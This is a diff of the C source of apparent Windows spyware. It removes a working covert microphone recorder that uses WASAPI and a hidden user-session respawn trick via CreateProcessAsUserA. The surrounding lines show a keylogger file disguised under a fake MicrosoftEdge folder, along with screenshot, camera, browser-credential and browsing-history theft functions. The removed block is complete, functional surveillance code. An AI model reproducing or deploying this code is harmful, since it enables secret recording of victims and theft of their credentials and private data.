@@ -10,17 +10,11 @@
 #include <windows.h>
 #include <wincrypt.h>
 #include <wtsapi32.h>
-/* MF headers must come before audioclient.h: strmif.h (pulled by mfapi.h)
- * sets TIMECODE_DEFINED and __DDRAW_INCLUDED__ so that ksmedia.h (pulled by
- * audioclient.h) skips the conflicting tagTIMECODE_SAMPLE / DDPIXELFORMAT
- * redefinitions in older mingw-w64 toolchains. */
 #include <initguid.h>
 #include <mfapi.h>
 #include <mfidl.h>
 #include <mfreadwrite.h>
 #include <mferror.h>
-#include <mmdeviceapi.h>
-#include <audioclient.h>
 
 #define KEYLOG_FILE "C:\\Users\\Public\\MicrosoftEdge\\kl.dat"
 
@@ -369,181 +363,6 @@ char *spy_screenshot_capture(int *len_out)
     return gdi_screenshot(len_out);
 }
 
-/* ── WASAPI microphone recording ─────────────────────────────────────────
- *
- * Captures PCM audio from the default recording device for duration_sec
- * seconds and returns a heap-allocated WAV file.  Must run in the
- * interactive user session (not Session 0) — caller uses the session-helper
- * pattern (--mic-record <dur> <path>) to ensure this. */
-static char *wasapi_mic_record(int duration_sec, int *len_out)
-{
-    HRESULT hr;
-    IMMDeviceEnumerator  *pEnum    = NULL;
-    IMMDevice            *pDevice  = NULL;
-    IAudioClient         *pClient  = NULL;
-    IAudioCaptureClient  *pCapture = NULL;
-
-    CoInitializeEx(NULL, COINIT_MULTITHREADED);
-
-    hr = CoCreateInstance(&CLSID_MMDeviceEnumerator, NULL, CLSCTX_ALL,
-                          &IID_IMMDeviceEnumerator, (void **)&pEnum);
-    if (FAILED(hr)) { CoUninitialize(); return NULL; }
-
-    hr = pEnum->lpVtbl->GetDefaultAudioEndpoint(pEnum, eCapture, eConsole, &pDevice);
-    pEnum->lpVtbl->Release(pEnum);
-    if (FAILED(hr)) { CoUninitialize(); return NULL; }
-
-    hr = pDevice->lpVtbl->Activate(pDevice, &IID_IAudioClient, CLSCTX_ALL,
-                                    NULL, (void **)&pClient);
-    pDevice->lpVtbl->Release(pDevice);
-    if (FAILED(hr)) { CoUninitialize(); return NULL; }
-
-    /* Force 16-bit stereo PCM; AUTOCONVERTPCM handles any device format */
-    WAVEFORMATEX wfx;
-    memset(&wfx, 0, sizeof(wfx));
-    wfx.wFormatTag      = WAVE_FORMAT_PCM;
-    wfx.nChannels       = 2;
-    wfx.nSamplesPerSec  = 44100;
-    wfx.wBitsPerSample  = 16;
-    wfx.nBlockAlign     = wfx.nChannels * (wfx.wBitsPerSample / 8);
-    wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
-
-    hr = pClient->lpVtbl->Initialize(pClient,
-             AUDCLNT_SHAREMODE_SHARED,
-             AUDCLNT_STREAMFLAGS_AUTOCONVERTPCM | AUDCLNT_STREAMFLAGS_SRC_DEFAULT_QUALITY,
-             10000000 /* 1-second buffer */, 0, &wfx, NULL);
-    if (FAILED(hr)) {
-        pClient->lpVtbl->Release(pClient);
-        CoUninitialize();
-        return NULL;
-    }
-
-    hr = pClient->lpVtbl->GetService(pClient, &IID_IAudioCaptureClient,
-                                      (void **)&pCapture);
-    if (FAILED(hr)) {
-        pClient->lpVtbl->Release(pClient);
-        CoUninitialize();
-        return NULL;
-    }
-
-    int max_audio = duration_sec * (int)wfx.nAvgBytesPerSec + 65536;
-    char *audio   = malloc(max_audio);
-    int   audio_len = 0;
-
-    pClient->lpVtbl->Start(pClient);
-
-    DWORD end_tick = GetTickCount() + (DWORD)(duration_sec * 1000);
-    while (GetTickCount() < end_tick) {
-        Sleep(10);
-        UINT32 packet_size = 0;
-        pCapture->lpVtbl->GetNextPacketSize(pCapture, &packet_size);
-        while (packet_size) {
-            BYTE   *pData  = NULL;
-            UINT32  frames = 0;
-            DWORD   flags  = 0;
-            hr = pCapture->lpVtbl->GetBuffer(pCapture, &pData, &frames, &flags, NULL, NULL);
-            if (FAILED(hr)) break;
-            int bytes = (int)(frames * wfx.nBlockAlign);
-            if (audio && audio_len + bytes <= max_audio) {
-                if (flags & AUDCLNT_BUFFERFLAGS_SILENT)
-                    memset(audio + audio_len, 0, bytes);
-                else
-                    memcpy(audio + audio_len, pData, bytes);
-                audio_len += bytes;
-            }
-            pCapture->lpVtbl->ReleaseBuffer(pCapture, frames);
-            pCapture->lpVtbl->GetNextPacketSize(pCapture, &packet_size);
-        }
-    }
-
-    pClient->lpVtbl->Stop(pClient);
-    pCapture->lpVtbl->Release(pCapture);
-    pClient->lpVtbl->Release(pClient);
-    CoUninitialize();
-
-    if (!audio || audio_len == 0) { free(audio); return NULL; }
-
-    /* Build WAV: 44-byte header + PCM data */
-    int   wav_size = 44 + audio_len;
-    char *wav      = malloc(wav_size);
-    if (!wav) { free(audio); return NULL; }
-
-    DWORD riff_size       = (DWORD)(wav_size - 8);
-    DWORD fmt_chunk_size  = 16;
-    WORD  pcm_tag         = WAVE_FORMAT_PCM;
-    DWORD data_size       = (DWORD)audio_len;
-
-    memcpy(wav +  0, "RIFF", 4);
-    memcpy(wav +  4, &riff_size,           4);
-    memcpy(wav +  8, "WAVE", 4);
-    memcpy(wav + 12, "fmt ", 4);
-    memcpy(wav + 16, &fmt_chunk_size,       4);
-    memcpy(wav + 20, &pcm_tag,              2);
-    memcpy(wav + 22, &wfx.nChannels,        2);
-    memcpy(wav + 24, &wfx.nSamplesPerSec,   4);
-    memcpy(wav + 28, &wfx.nAvgBytesPerSec,  4);
-    memcpy(wav + 32, &wfx.nBlockAlign,      2);
-    memcpy(wav + 34, &wfx.wBitsPerSample,   2);
-    memcpy(wav + 36, "data", 4);
-    memcpy(wav + 40, &data_size,            4);
-    memcpy(wav + 44, audio,                 audio_len);
-
-    free(audio);
-    *len_out = wav_size;
-    return wav;
-}
-
-/* Session helper: spawn self as --mic-record <dur> <path> in user session */
-static char *mic_via_user_session(int duration_sec, int *len_out,
-                                   DWORD console_session)
-{
-    HANDLE hToken = NULL;
-    if (!WTSQueryUserToken(console_session, &hToken)) return NULL;
-
-    char self_path[MAX_PATH];
-    GetModuleFileNameA(NULL, self_path, sizeof(self_path));
-
-    const char *tmp_path = "C:\\Users\\Public\\MicrosoftEdge\\mc.tmp";
-    char cmd[MAX_PATH + 96];
-    _snprintf(cmd, sizeof(cmd), "\"%s\" --mic-record %d \"%s\"",
-              self_path, duration_sec, tmp_path);
-
-    STARTUPINFOA si;
-    ZeroMemory(&si, sizeof(si));
-    si.cb          = sizeof(si);
-    si.dwFlags     = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-    PROCESS_INFORMATION pi;
-    ZeroMemory(&pi, sizeof(pi));
-
-    BOOL ok = CreateProcessAsUserA(hToken, NULL, cmd, NULL, NULL,
-                                    FALSE, CREATE_NO_WINDOW,
-                                    NULL, NULL, &si, &pi);
-    CloseHandle(hToken);
-    if (!ok) return NULL;
-
-    /* Wait up to (duration + 5) seconds for the helper to finish */
-    WaitForSingleObject(pi.hProcess, (DWORD)((duration_sec + 5) * 1000));
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-
-    char *data = read_file_heap_plain(tmp_path, len_out);
-    DeleteFileA(tmp_path);
-    return data;
-}
-
-char *spy_mic_record(int duration_sec, int *len_out)
-{
-    DWORD my_session      = 0;
-    DWORD console_session = WTSGetActiveConsoleSessionId();
-    ProcessIdToSessionId(GetCurrentProcessId(), &my_session);
-
-    if (my_session != console_session)
-        return mic_via_user_session(duration_sec, len_out, console_session);
-
-    return wasapi_mic_record(duration_sec, len_out);
-}
-
 /* ── Media Foundation camera snapshot ────────────────────────────────────
  *
  * Enumerates video capture devices, opens the first one, reads one RGB24
@@ -833,7 +652,6 @@ char *spy_clipboard_get(int *len_out) { *len_out = 0; return NULL; }
 char *spy_screenshot_capture(int *len_out) { *len_out = 0; return NULL; }
 char *spy_browser_creds_steal(int *len_out) { *len_out = 0; return NULL; }
 char *spy_browser_history_steal(int *len_out) { *len_out = 0; return NULL; }
-char *spy_mic_record(int duration_sec, int *len_out) { (void)duration_sec; *len_out = 0; return NULL; }
 char *spy_camera_snapshot(int *len_out) { *len_out = 0; return NULL; }
 const char *spy_camera_last_error(void) { return ""; }
 #endif
